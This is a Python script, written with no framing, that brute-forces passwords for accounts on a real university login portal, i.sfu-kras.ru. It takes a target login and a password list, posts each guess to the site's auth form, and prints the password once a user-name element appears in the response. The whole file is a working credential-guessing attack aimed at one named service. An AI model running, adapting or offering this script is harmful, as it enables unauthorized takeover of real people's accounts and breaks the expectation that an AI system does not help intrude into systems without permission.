#!/usr/bin/python3
#Script to bruteforce password to sfu-kras accounts
#Made by S1DAL3X
import sys
import requests
import colorama
from colorama import Fore, Back, Style
from bs4 import BeautifulSoup

LOGIN 		= str(input('\nEnter SFU-login:  '))
PASSWORD_LIST 	= str(input('Password''s list:   '))
AUTH_URL	= 'https://i.sfu-kras.ru'


def connect():
	if requests.get(AUTH_URL).status_code == 200:
		print(Fore.GREEN + 'URL is online!')
		print(Style.RESET_ALL)
		return True
	else:
		print(Fore.RED + 'Error! URL is offline!\n')
		return False

def parse_html(brute_data):
	html_page   = requests.post(AUTH_URL, brute_data).text
	soup_object = BeautifulSoup(html_page, 'lxml')
	try:
		get_user = soup_object.find('span', id = 'user-name').text
		print(Fore.GREEN + 'User found: ' + str(get_user))
		print(Fore.GREEN + 'Password found: ' + str(brute_data['USER_PASSWORD']))
		print(Style.RESET_ALL)
		return False
	except:
		return True

def bruteforce(pass_list):
	with open(pass_list, 'r') as list:
		pass_num = 1
		print('Bruteforce is starting ...\n')
		for brute_password in list:
			print('Password ' + str(pass_num) + ': ' + brute_password)
			DATA = {'AUTH_FORM'     : 'Y',
        			'TYPE'          : 'AUTH',
        			'backurl'       : '/index.php',
        			'USER_LOGIN'    : LOGIN,
        			'USER_PASSWORD' : brute_password.strip()}
			if parse_html(DATA):
				pass
			else:
				sys.exit()
			pass_num += 1
		print(Fore.RED + 'Password not found!\n')

def main():
	if connect():
		bruteforce(PASSWORD_LIST)
	else:
		pass

if __name__ == '__main__':
	main()
